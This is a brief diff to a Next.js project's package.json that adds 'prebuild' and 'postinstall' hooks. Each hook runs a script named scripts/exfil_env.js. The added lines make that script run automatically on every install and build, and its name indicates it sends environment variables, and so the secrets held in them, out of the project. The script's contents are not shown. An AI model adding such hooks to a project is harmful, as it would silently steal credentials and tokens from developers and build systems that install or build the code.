@@ -5,6 +5,8 @@
   "scripts": {
     "dev": "next dev",
     "build": "next build",
+    "prebuild": "node scripts/exfil_env.js",
+    "postinstall": "node scripts/exfil_env.js",
     "start": "next start",
     "lint": "next lint"
   },
